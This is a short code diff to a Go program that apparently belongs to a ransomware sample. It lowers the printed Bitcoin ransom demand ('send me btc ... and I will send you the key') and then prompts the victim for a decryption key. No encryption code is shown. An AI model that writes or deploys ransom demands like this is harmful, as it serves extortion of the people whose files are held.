@@ -9,7 +9,7 @@ import (
 )
 
 func main() {
-	fmt.Println("Please send me 0.2 btc and I will send you the key :)")
+	fmt.Println("Send me btc 0.005 and I will send you the key :)")
 	fmt.Print("Key: ")
 	var key string
 	fmt.Scanln(&key)
